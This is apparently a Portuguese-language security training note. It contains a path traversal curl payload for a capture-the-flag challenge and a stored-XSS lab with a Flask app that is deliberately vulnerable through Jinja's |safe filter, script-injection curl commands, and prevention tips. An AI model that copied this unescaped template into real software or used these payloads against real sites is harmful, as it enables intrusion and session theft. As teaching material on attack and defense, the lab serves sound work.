1  Path Traversal! 🛡️
curl "http://challenge.localhost/blob/..%2f..%2f..%2fflag"
## 2 xss

<h1>Laboratório Seguro de XSS Armazenado</h1>

  <h2>1. Estrutura do laboratório</h2>
    <pre>
xss_lab/
│
├─ app.py          # Aplicação Flask simulando site vulnerável
├─ templates/
│   └─ index.html  # Página principal com formulário
└─ posts.db        # Banco de dados SQLite para armazenar posts
    </pre>

  <h2>2. Código do servidor (Flask)</h2>
    <h3>app.py</h3>
    <pre><code>from flask import Flask, request, render_template, redirect
import sqlite3

app = Flask(__name__)
DB_FILE = "posts.db"

# Cria tabela se não existir
conn = sqlite3.connect(DB_FILE)
conn.execute("CREATE TABLE IF NOT EXISTS posts (id INTEGER PRIMARY KEY, content TEXT)")
conn.close()

@app.route("/", methods=["GET"])
def index():
    conn = sqlite3.connect(DB_FILE)
    cur = conn.cursor()
    cur.execute("SELECT content FROM posts ORDER BY id DESC")
    posts = cur.fetchall()
    conn.close()
    return render_template("index.html", posts=posts)

@app.route("/post", methods=["POST"])
def post():
    content = request.form.get("content", "")
    # Simula vulnerabilidade: NÃO escapamos HTML
    conn = sqlite3.connect(DB_FILE)
    cur = conn.cursor()
    cur.execute("INSERT INTO posts (content) VALUES (?)", (content,))
    conn.commit()
    conn.close()
    return redirect("/")
    
if __name__ == "__main__":
    app.run(debug=True, port=5000)
</code></pre>

  <h2>3. Template HTML</h2>
    <h3>templates/index.html</h3>
    <pre><code>&lt;!doctype html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
  &lt;meta charset="UTF-8"&gt;
  &lt;title&gt;Laboratório XSS&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;h1&gt;Postagens&lt;/h1&gt;
  &lt;form method="post" action="/post"&gt;
    &lt;input type="text" name="content" placeholder="Escreva algo malicioso..."&gt;
    &lt;input type="submit" value="Enviar"&gt;
  &lt;/form&gt;
  &lt;hr&gt;
  &lt;h2&gt;Últimas postagens&lt;/h2&gt;
  {% for post in posts %}
    &lt;div&gt;{{ post[0]|safe }}&lt;/div&gt;
  {% endfor %}
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
    <p><strong>Nota:</strong> o <code>|safe</code> no Jinja2 permite que o HTML seja renderizado diretamente, simulando uma vulnerabilidade XSS armazenada.</p>

  <h2>4. Testando o XSS</h2>

  <h3>4.1 Injetando uma carga maliciosa</h3>
    <pre><code>curl -X POST http://localhost:5000/post \
     -d 'content=&lt;input type="text"&gt;&lt;input type="text"&gt;&lt;input type="text"&gt;'</code></pre>
    <p>O servidor salva o post no banco. Ao visitar <a href="http://localhost:5000/" target="_blank">http://localhost:5000/</a>, o navegador renderiza 3 caixas de texto automaticamente. Isso simula como um atacante poderia injetar HTML/JS que será executado em outros usuários.</p>

   <h3>4.2 Simulando roubo de cookie (laboratório seguro)</h3>
    <pre><code>curl -X POST http://localhost:5000/post \
     -d 'content=&lt;script&gt;alert("Cookie: fake_cookie")&lt;/script&gt;'</code></pre>
    <p>O script é executado quando qualquer usuário visita a página. No laboratório, apenas dispara um alerta para não prejudicar ninguém. No mundo real, poderia capturar cookies ou realizar ações não autorizadas.</p>

  <h2>5. Boas práticas de prevenção</h2>
    <ul>
        <li><strong>Escapar entradas do usuário:</strong>
            <pre><code>from markupsafe import escape
content = escape(request.form.get("content", ""))</code></pre>
        </li>
        <li><strong>Sanitizar HTML com bibliotecas, como Bleach:</strong>
            <pre><code>import bleach
safe_content = bleach.clean(content, tags=[], attributes={})</code></pre>
        </li>
        <li>Configurar <strong>CSP (Content Security Policy)</strong> no servidor de produção.</li>
        <li>Limitar tamanho e tipo de entrada de usuários.</li>
    </ul>

<h2>✅ Resumo do laboratório</h2>
    <ul>
        <li>Você criou um servidor Flask que simula XSS armazenado.</li>
        <li>Pode injetar HTML/JS que será executado no navegador da “vítima”.</li>
        <li>Testes são 100% seguros, controlados e educativos.</li>
        <li>Demonstra na prática como o XSS armazenado funciona e como prevenir.</li>
    </ul>
